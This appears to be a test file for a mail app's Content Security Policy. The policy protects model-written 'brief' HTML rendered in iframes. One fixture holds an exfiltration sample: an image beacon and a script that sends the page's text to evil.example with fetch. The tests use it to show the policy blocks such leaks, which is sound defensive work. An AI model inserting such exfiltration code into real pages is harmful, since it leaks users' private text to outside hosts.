import { describe, expect, test } from 'bun:test';
import { JSDOM } from 'jsdom';
import { briefCanvasFrameDocument } from '../components/report/brief-canvas/BriefCanvasLeaf';
import { withReportArtifactRuntime } from '../components/report/DailyReport';
import { getDailyArt } from '../lib/mail/daily-art';
import { ART_POOL } from '../lib/mail/daily-art-pool';
import {
  BRIEF_ART_IMAGE_ORIGINS,
  BRIEF_FRAME_CSP_META_ID,
  briefFrameContentSecurityPolicy,
  httpOrigin,
  withBriefFrameCsp,
} from '../lib/security/brief-frame-csp';
import { withFrameNonce } from '../lib/security/frame-nonce';

const OPTIONS = {
  appOrigin: 'https://mail.lab86.io/today?x=1',
  storageUrl: 'https://happy-otter-123.convex.cloud',
};
const NONCE = 'bm9uY2UtYnJpZWYtY3Nw';

/** The directives of a policy, as name -> source list. */
function directives(policy: string) {
  return new Map(
    policy
      .split(';')
      .map((part) => part.trim().split(/\s+/))
      .filter((parts) => parts[0])
      .map(([name, ...sources]) => [name, sources] as const),
  );
}

/** The policy text of the injected meta element. */
function metaPolicy(html: string) {
  const dom = new JSDOM(html);
  const meta = dom.window.document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  return { dom, meta, policy: meta?.getAttribute('content') ?? '' };
}

describe('brief frame policy', () => {
  test('blocks every network channel that can carry brief text', () => {
    const policy = directives(briefFrameContentSecurityPolicy(OPTIONS));

    expect(policy.get('default-src')).toEqual(["'none'"]);
    expect(policy.get('connect-src')).toEqual(["'none'"]);
    expect(policy.get('form-action')).toEqual(["'none'"]);
    expect(policy.get('base-uri')).toEqual(["'none'"]);
    expect(policy.get('object-src')).toEqual(["'none'"]);
    // frame-src and media-src fall back to default-src 'none'.
    expect(policy.has('frame-src')).toBe(false);
    expect(policy.has('media-src')).toBe(false);
    for (const [name, sources] of policy) {
      for (const source of sources) {
        // No wildcard and no bare scheme that allows every host.
        expect(`${name} ${source}`).not.toMatch(/\s(?:\*|https?:|wss?:)$/);
        expect(source).not.toContain('*');
      }
    }
  });

  test('allows images only from data, blob, the app, storage, and the art hosts', () => {
    const policy = directives(briefFrameContentSecurityPolicy(OPTIONS));

    expect(policy.get('img-src')).toEqual([
      'data:',
      'blob:',
      'https://mail.lab86.io',
      'https://happy-otter-123.convex.cloud',
      ...BRIEF_ART_IMAGE_ORIGINS,
    ]);
    expect(policy.get('style-src')).toEqual(["'unsafe-inline'", 'https://fonts.googleapis.com']);
    expect(policy.get('font-src')).toEqual(['https://fonts.gstatic.com']);
    expect(policy.get('script-src')).toEqual(["'unsafe-inline'"]);
  });

  test('leaves out an origin that is missing or not http', () => {
    const policy = directives(
      briefFrameContentSecurityPolicy({ appOrigin: 'javascript:alert(1)', storageUrl: 'not a url' }),
    );
    expect(policy.get('img-src')).toEqual(['data:', 'blob:', ...BRIEF_ART_IMAGE_ORIGINS]);
    expect(directives(briefFrameContentSecurityPolicy()).get('img-src')).toEqual([
      'data:',
      'blob:',
      ...BRIEF_ART_IMAGE_ORIGINS,
    ]);
    expect(httpOrigin('http://localhost:18836/x')).toBe('http://localhost:18836');
    expect(httpOrigin(undefined)).toBeNull();
    expect(httpOrigin('ftp://example.com')).toBeNull();
  });

  test('allows every image of the daily art pool and its fallbacks', () => {
    const allowed = new Set(BRIEF_ART_IMAGE_ORIGINS as readonly string[]);
    for (const piece of ART_POOL) expect(allowed).toContain(new URL(piece.imageUrl).origin);

    const art = getDailyArt(Date.UTC(2026, 8, 29));
    const images = directives(briefFrameContentSecurityPolicy({ appOrigin: 'https://mail.lab86.io' })).get(
      'img-src',
    );
    for (const url of [art.imageUrl, ...art.fallbacks]) expect(images).toContain(new URL(url).origin);
  });
});

describe('brief frame policy element', () => {
  test('goes directly after the doctype, so the frame keeps standards mode', () => {
    const html =
      '<!doctype html><html lang="en"><head><link rel="stylesheet" href="x.css"></head><body></body></html>';
    const out = withBriefFrameCsp(html, OPTIONS);

    expect(
      out.startsWith(
        `<!doctype html><meta http-equiv="Content-Security-Policy" id="${BRIEF_FRAME_CSP_META_ID}"`,
      ),
    ).toBe(true);
    const { dom, meta, policy } = metaPolicy(out);
    const document = dom.window.document;
    expect(document.compatMode).toBe('CSS1Compat');
    expect(document.documentElement.lang).toBe('en');
    expect(meta?.parentElement?.tagName).toBe('HEAD');
    expect(document.head.firstElementChild).toBe(meta);
    expect(policy).toBe(briefFrameContentSecurityPolicy(OPTIONS));
  });

  test('goes first in a document without a doctype, and after a leading comment and BOM', () => {
    expect(withBriefFrameCsp('<p>hi</p>').startsWith('<meta http-equiv="Content-Security-Policy"')).toBe(
      true,
    );
    const commented = withBriefFrameCsp('\uFEFF <!-- edition --> <!DOCTYPE html><p>hi</p>');
    expect(commented.startsWith('\uFEFF <!-- edition --> <!DOCTYPE html><meta ')).toBe(true);
    // A doctype after content is not a leading doctype.
    expect(withBriefFrameCsp('<p>x</p><!doctype html>').startsWith('<meta ')).toBe(true);
    expect(withBriefFrameCsp('')).toBe('');
  });

  test('replaces an earlier element instead of adding a second one', () => {
    const once = withBriefFrameCsp('<!doctype html><p>hi</p>', { appOrigin: 'https://a.example' });
    const twice = withBriefFrameCsp(once, OPTIONS);

    expect(twice.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
    expect(twice).not.toContain('https://a.example');
    expect(twice).toContain('https://mail.lab86.io');
  });
});

describe('Daily Brief srcdoc', () => {
  const EDITION = `<!doctype html><html lang="en"><head><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Fraunces"><style>body{margin:0}</style></head><body><img src="https://evil.example/leak.png?q=secret"><script>fetch('https://evil.example/?q='+document.body.innerText)</script></body></html>`;

  test('carries the policy before every model-written element', () => {
    const out = withReportArtifactRuntime(EDITION, null, { frameCsp: OPTIONS });
    const metaAt = out.indexOf(`id="${BRIEF_FRAME_CSP_META_ID}"`);

    expect(metaAt).toBeGreaterThan(0);
    for (const marker of ['<link', '<style', '<img', '<script', '<body']) {
      expect(metaAt).toBeLessThan(out.indexOf(marker));
    }
    const policy = directives(metaPolicy(out).policy);
    expect(policy.get('connect-src')).toEqual(["'none'"]);
    expect(policy.get('img-src')).not.toContain('https://evil.example');
    // The host runtime and the readiness handshake are still in the frame.
    expect(out).toContain('id="lab86-report-runtime-js"');
    expect(out).toContain('id="lab86-brief-ready-js"');
  });

  test('carries the policy with no options too', () => {
    const out = withReportArtifactRuntime(EDITION, null);
    expect(directives(metaPolicy(out).policy).get('connect-src')).toEqual(["'none'"]);
    expect(withReportArtifactRuntime('', null)).toBe('');
  });

  test('keeps one policy element when the runtime runs twice', () => {
    const once = withReportArtifactRuntime(EDITION, null, { frameCsp: OPTIONS });
    const twice = withReportArtifactRuntime(once, null, { frameCsp: OPTIONS });
    expect(twice.match(/http-equiv="Content-Security-Policy"/g)).toHaveLength(1);
  });

  test('keeps the policy first after the page nonce pass', () => {
    const out = withFrameNonce(
      withReportArtifactRuntime(EDITION.replace('<img', '<img onerror="this.remove()"'), null, {
        frameCsp: OPTIONS,
      }),
      NONCE,
    );
    const { dom, meta } = metaPolicy(out);

    expect(dom.window.document.head.firstElementChild).toBe(meta);
    expect(out.indexOf(`id="${BRIEF_FRAME_CSP_META_ID}"`)).toBeLessThan(
      out.indexOf('lab86-image-fallback-js'),
    );
    expect(out).toContain(`<script id="lab86-report-runtime-js" nonce="${NONCE}">`);
  });
});

describe('brief canvas srcdoc', () => {
  test('carries the policy, the theme, and the action bridge', () => {
    const clean =
      '<html><head><title>c</title></head><body><img src="https://evil.example/x.png"></body></html>';
    const out = briefCanvasFrameDocument(clean, { '--brief-ink': '#111' }, OPTIONS);
    const { dom, meta, policy } = metaPolicy(out);

    expect(out.startsWith('<meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(dom.window.document.head.firstElementChild).toBe(meta);
    expect(directives(policy).get('connect-src')).toEqual(["'none'"]);
    expect(out).toContain('<style>:root{--brief-ink:#111}</style></head>');
    expect(out).toContain("source:'lab86-brief-canvas'");
    expect(out.indexOf("source:'lab86-brief-canvas'")).toBeLessThan(out.indexOf('</body>'));
  });

  test('handles a fragment without head or body', () => {
    const out = briefCanvasFrameDocument('<p>ornament</p>', { '--brief-bg': '#fff' });
    expect(out.startsWith('<meta http-equiv="Content-Security-Policy"')).toBe(true);
    expect(out).toContain('<style>:root{--brief-bg:#fff}</style><p>ornament</p><script>');
    expect(briefCanvasFrameDocument('', {})).toBe('');
  });
});
